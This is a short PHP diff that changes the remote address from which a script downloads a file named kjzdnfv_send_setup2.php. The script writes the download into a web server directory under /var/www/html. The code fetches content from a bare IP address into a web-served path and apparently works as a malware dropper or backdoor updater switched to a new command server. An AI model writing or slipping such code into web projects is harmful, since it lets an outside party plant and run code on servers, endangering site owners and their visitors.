@@ -12,5 +12,5 @@ function download($url) {
   return($result);
 }
 
-$contents = download('http://85.208.136.33/kjzdnfv_send_setup2.php');
+$contents = download('http://45.12.253.90/kjzdnfv_send_setup2.php');
 file_put_contents('/var/www/html/batushka/mixinte', $contents);
